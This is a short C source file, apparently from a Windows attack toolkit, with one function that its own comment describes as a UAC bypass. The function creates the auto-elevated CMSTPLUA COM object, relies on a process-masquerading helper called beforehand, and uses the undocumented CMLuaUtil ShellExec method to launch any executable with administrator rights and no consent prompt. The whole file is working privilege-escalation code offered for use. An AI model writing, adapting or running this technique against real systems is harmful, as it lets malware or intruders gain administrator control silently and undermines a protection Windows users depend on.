
//==============================================================================
//
//  api0cradle.c 
//
//==============================================================================
//  Ars Scriptum - made in quebec 2020 <guillaumeplante.qc>
//==============================================================================


#include "global.h"

/*
* ucmCMLuaUtilShellExecMethod
*
* Purpose:
*
* Bypass UAC using AutoElevated undocumented CMLuaUtil interface.
* This function expects that supMasqueradeProcess was called on process initialization.
*
*/
NTSTATUS ucmCMLuaUtilShellExecMethod(
    _In_ LPWSTR lpszExecutable
)
{
    NTSTATUS    MethodResult = STATUS_ACCESS_DENIED;
    HRESULT     r = E_FAIL, hr_init;
    ICMLuaUtil* CMLuaUtil = NULL;

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {

        r = ucmAllocateElevatedObject(
            T_CLSID_CMSTPLUA,
            &IID_ICMLuaUtil,
            CLSCTX_LOCAL_SERVER,
            (void**)&CMLuaUtil);

        if (r != S_OK)
            break;

        if (CMLuaUtil == NULL) {
            r = E_OUTOFMEMORY;
            break;
        }

        r = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil,
            lpszExecutable,
            NULL,
            NULL,
            SEE_MASK_DEFAULT,
            SW_SHOW);

        if (SUCCEEDED(r))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    if (CMLuaUtil != NULL) {
        CMLuaUtil->lpVtbl->Release(CMLuaUtil);
    }

    if (hr_init == S_OK)
        CoUninitialize();

    return MethodResult;
}

